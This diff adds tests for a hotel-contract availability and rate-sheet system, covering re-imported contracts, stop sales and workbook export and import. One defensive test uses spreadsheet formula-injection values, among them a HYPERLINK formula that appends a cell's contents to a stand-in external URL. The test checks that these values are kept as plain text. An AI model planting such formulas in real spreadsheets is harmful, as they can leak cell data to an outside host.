@@ -5,7 +5,7 @@ desk, export -> import) runs on PostgreSQL in ``tests/integration/test_aa1153_al
 
 from __future__ import annotations
 
-from datetime import date
+from datetime import UTC, date, datetime
 from typing import Any
 
 import pytest
@@ -21,6 +21,7 @@ ROOM = "00000000-0000-4000-8000-0000000a1153"
 DMC_A, DMC_B = "00000000-0000-4000-8000-00000000d0ca", "00000000-0000-4000-8000-00000000d0cb"
 NIGHT = date(2027, 3, 10)
 TODAY = date(2027, 2, 1)
+PUBLISHED, REPUBLISHED = datetime(2027, 1, 5, 9, tzinfo=UTC), datetime(2027, 1, 20, 9, tzinfo=UTC)
 
 
 def _row(rid: str, supplier: str, kind: str = "allotment", **kw: Any) -> dict[str, Any]:
@@ -28,6 +29,7 @@ def _row(rid: str, supplier: str, kind: str = "allotment", **kw: Any) -> dict[st
         "id": rid, "room_type_id": ROOM, "service_id": None, "supplier_id": supplier, "kind": kind,
         "date_from": date(2027, 3, 1), "date_to": date(2027, 3, 31), "units": kw.get("units"),
         "release_days": kw.get("release_days"), "max_pax": kw.get("max_pax"), "status": "contract", "ended": False,
+        "contract_id": kw.get("contract", "k-1"), "published_at": kw.get("published_at", PUBLISHED),
     }  # fmt: skip
 
 
@@ -78,6 +80,35 @@ async def test_another_dmcs_allotment_never_answers_for_this_dmc() -> None:
     assert (b.status, b.reason) == ("on_request", "no_terms")
     [any_dmc] = await availability.many(conn, [_ask(1, None)], today=TODAY)  # the staff check without a DMC
     assert any_dmc.reason == "allotment"
+
+
+@pytest.mark.asyncio
+async def test_a_reimported_contract_replaces_the_terms_it_copies_never_doubles_them() -> None:
+    # Export, edit, import back, publish: two published contracts of DMC B with the same allotment of 2 rooms.
+    old = _row("a", DMC_B, units=2, release_days=7, contract="k-1", published_at=PUBLISHED)
+    new = _row("b", DMC_B, units=2, release_days=7, contract="k-2", published_at=REPUBLISHED)
+    conn = _conn([old, new])
+    two, three = await availability.many(conn, [_ask(2), _ask(3)], today=TODAY)
+    assert (two.status, two.restriction_id) == ("available", "b")  # the newest contract's term answers
+    assert (three.status, three.reason) == ("on_request", "allotment_full")  # 2 rooms, not 2 + 2
+    # The new contract closes the allotment with an on-request term: the older allotment no longer answers.
+    closed = _row("c", DMC_B, "on_request", contract="k-2", published_at=REPUBLISHED)
+    [ask] = await availability.many(_conn([old, closed]), [_ask(1)], today=TODAY)
+    assert (ask.status, ask.reason) == ("on_request", "on_request")
+    # Another DMC's contract is its own: the staff check without a DMC still adds both DMCs' allotments.
+    other = _row("d", DMC_A, units=3, release_days=0, contract="k-9", published_at=PUBLISHED)
+    [five] = await availability.many(_conn([old, new, other]), [_ask(5, None)], today=TODAY)
+    [six] = await availability.many(_conn([old, new, other]), [_ask(6, None)], today=TODAY)
+    assert (five.reason, six.reason) == ("allotment", "allotment_full")
+
+
+def test_a_stop_sale_on_the_older_contract_still_counts() -> None:
+    stop = restrictions.Restriction("s", "stop_sale", date(2027, 3, 1), date(2027, 3, 31), "approved",
+                                    supplier_id=DMC_B, contract_id="k-1", published_at=PUBLISHED)  # fmt: skip
+    term = restrictions.Restriction("b", "allotment", date(2027, 3, 1), date(2027, 3, 31), "contract", units=2,
+                                    supplier_id=DMC_B, contract_id="k-2", published_at=REPUBLISHED)  # fmt: skip
+    verdict = restrictions.evaluate([stop, term], NIGHT, pax=2, today=TODAY)
+    assert (verdict.status, verdict.reason) == ("on_request", "stop_sale")
 
 
 @pytest.mark.asyncio
@@ -223,6 +254,29 @@ def test_template_has_the_inventory_sheet_and_labels_match_the_kinds() -> None:
     assert tuple(header) == rate_sheet_inventory.COLUMNS
     assert set(rate_sheet_inventory.LABELS) == set(restrictions.TERM_KINDS)
     assert all(rate_sheet_inventory.KINDS[label] == kind for kind, label in rate_sheet_inventory.LABELS.items())
+
+
+def test_export_keeps_formula_like_text_as_text_and_it_imports_back_the_same() -> None:
+    import io
+
+    from openpyxl import load_workbook
+
+    title = '=HYPERLINK("https://example.invalid/?"&B2,"open")'
+    rate = [("HB-LOTUS", "Deluxe", None, "2027-01-01", "2027-12-31", "BB", None, None, "50", "=1+1")]
+    inventory = [("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-01", "2027-03-31", 2, 7, None, "@SUM(A1)")]
+    data = rate_sheet.build_workbook({**CONTRACT, "Title": title}, rate, inventory_rows=inventory)
+    wb = load_workbook(io.BytesIO(data))
+    hotel, inventory_sheet = wb[rate_sheet.HOTEL_SHEET], wb[rate_sheet_inventory.SHEET]
+    cells = [wb[rate_sheet.CONTRACT_SHEET]["B1"], hotel["J2"], inventory_sheet["J2"]]
+    assert [(c.value, c.data_type, c.quotePrefix) for c in cells] == [
+        (title, "s", True), ("=1+1", "s", True), ("@SUM(A1)", "s", True),
+    ]  # fmt: skip
+    assert hotel["I2"].quotePrefix is False  # a plain value is left as it is
+    sheet = rate_sheet.parse(data)
+    assert not sheet.problems
+    assert sheet.contract["title"] == title
+    assert [r.values["notes"] for r in sheet.rows] == ["=1+1"]
+    assert [t["note"] for t in sheet.inventory] == ["@SUM(A1)"]
 
 
 def test_export_file_name_is_a_safe_header_value() -> None:
